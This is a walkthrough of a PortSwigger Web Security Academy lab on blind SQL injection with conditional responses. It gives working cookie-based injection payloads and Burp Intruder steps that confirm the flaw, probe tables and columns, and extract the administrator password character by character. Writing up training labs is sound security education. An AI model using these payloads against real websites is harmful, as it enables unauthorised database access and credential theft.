This write-up for the lab *Blind SQL injection with conditional responses* is part of my walkthrough series for [PortSwigger's Web Security Academy](https://portswigger.net/web-security).
Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses>  
Difficulty: PRACTITIONER  
Python script: [script.py](script.py)  

## Lab description

![Lab description](img/lab_description.png)

## Query

The query used in the lab will look something like

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

In the example case, the cookie contains this content
`Cookie: TrackingId=qnLH78fKAPMJdjw7; session=lcaWJjxc1ubzKT0CsGu2nDEfePtHIni5`

## Steps

### Confirm vulnerable parameter

Due to the type of vulnerability, we can not see any result of the query. However, if we can craft requests that allow for dedicated `good` and `bad` answers, we can ask the database anything it can answer with `TRUE` or `FALSE`.

So as a first step we need to confirm that the parameter is vulnerable by crafting requests that give `good` or `bad` answers.

#### The good case

For the `good` query, we take an input that always evaluates to `TRUE`, like `1=1`.

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and 1=1--'
```

The content of the cookie is

// 📝 SEND THE REQUEST IN REPEATER AND CHECK THE RESPONSE — VERY IMPORTANT

`Cookie: TrackingId=qnLH78fKAPMJdjw7' and 1=1--; session=lcaWJjxc1ubzKT0CsGu2nDEfePtHIni5`

--> Results in "Welcome back"

#### The bad case

For the `good` query, we take an input that always evaluates to `FALSE`, like `1=2`.

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and 1=2--'
```

The content of the cookie is

// 📝 CHECK THE RESPONSE — VERY IMPORTANT

`Cookie: TrackingId=qnLH78fKAPMJdjw7' and 1=2--; session=lcaWJjxc1ubzKT0CsGu2nDEfePtHIni5`

--> Does not result in "Welcome back"

As we found a vulnerable parameter, I omit the session value from now on.

### Confirm expected table

First I confirm that the `users` table exists. For this, I select a string literal from the table and compare the result to the literal.

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and  (select 'x' from users LIMIT 1)='x'--
```

Cookie content: `TrackingId=qnLH78fKAPMJdjw7' and (select 'x' from users LIMIT 1)='x'--`

--> Results in "Welcome back"

#### Verify negative result

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and  (select 'x' from usersX LIMIT 1)='x'--
```

Cookie content: `TrackingId=qnLH78fKAPMJdjw7' and (select 'x' from usersX LIMIT 1)='x'--`

--> NO "Welcome back"

### Verify columns exist as expected

Now onto the same verification regarding the column names

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and (select username from users where username='administrator')='administrator'--
```

Cookie content: `TrackingId=qnLH78fKAPMJdjw7' and (select username from users where username='administrator')='administrator'--`

--> Results in "Welcome back". Negative case with a different column name verified.

### Get the length of the password (could be hash as well)

Find out the length of the password. For this, we use the `LENGTH` function of the database and compare it with numbers.

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and (select username from users where username='administrator' and LENGTH(password)=1)='administrator'--
```

Cookie content: `TrackingId=qnLH78fKAPMJdjw7' and (select username from users where username='administrator' and LENGTH(password)=1)='administrator'--`

--> NO "Welcome back", the password is not of length 1

As an alternative, I can check with '>' instead of '='. It results in the "Welcome back" message meaning the password is longer than 1 character.

I Brute force the length with Burp Intruder (Sniper, Payload is '1' argument in query)

// 📝 RIGHT-CLICK ON THE REQUEST TAB IN REPEATER AND SEND TO INTRUDER.

THEN HIGHLIGHT 1 IN THE REQUEST PAYLOAD AND CLICK ADD.

PAYLOAD TYPE → SELECT NUMBERS AND SET CONFIGURATION FROM 1 TO 100.

![Payload_example](img/payload.png)

START THE ATTACK AND AFTER IT IS FINISHED, LOOK FOR THE HIGHEST LENGTH.

IN THAT REQUEST RESPONSE YOU’LL SEE LENGTH WHERE PASSWORD = 20 IS CORRECT, SO YOU ARE WELCOMED BACK.
![Payload_results](img/responce.png)

--> Password is exactly 20 characters long

### Enumerate password of the administrator

Now that we have the length of the password, we can brute force each character individually. If the database would store a hash of the password, we could extract the hash for offline cracking.

```sql
SELECT trackingId FROM someTable WHERE trackingId = 'qnLH78fKAPMJdjw7' and (select substring(password,1,1) from users where username='administrator')='a'--
```

Cookie content: `TrackingId=qnLH78fKAPMJdjw7' and (select substring(password,1,1) from users where username='administrator')='a'--`

We find out that the first character is not an `a`, but using Burp Suite Intruder this can be automated easily. With the free version, this is rather slow, but scripting it in python is not difficult either.

// 📝 SEND THE REQUEST WITH A NEW PAYLOAD TO INTRUDER AND HIGHLIGHT 'a'. THEN FOLLOW THE PIC ~~ THE HIGHEST LENGTH INDICATES THE FIRST LETTER.

![Enumerate the first character of the password](img/enumerate_password_first.png)

The first character is 'k'

#### Automate this

Now automate this for all characters, again using either Burp Intruder or a python script.

Attack type: *Cluster bomb*

![Cluster bomb setup](img/enumerate_password_cluster_bomb.png)

- *Payload 1*: numeric sequential, 1...20
- *Payload 2*: Brute force (see above) - for real-life, add special characters
  
// 📝 ADD 'WELCOME BACK' IN VIEW FILTER

This results in these responses with the 'Welcome Back' message:

![Result of password enumeration](img/enumerate_password_result.png)

Reordering it numerically according to Payload 1 will result in the password: kdd113dnq7t34h70nhj7

// 📝 YOUR PASSWORD WILL BE DIFFERENT EACH TIME. NOTE DOWN YOUR PASSWORD AND USE IT TO LOGIN
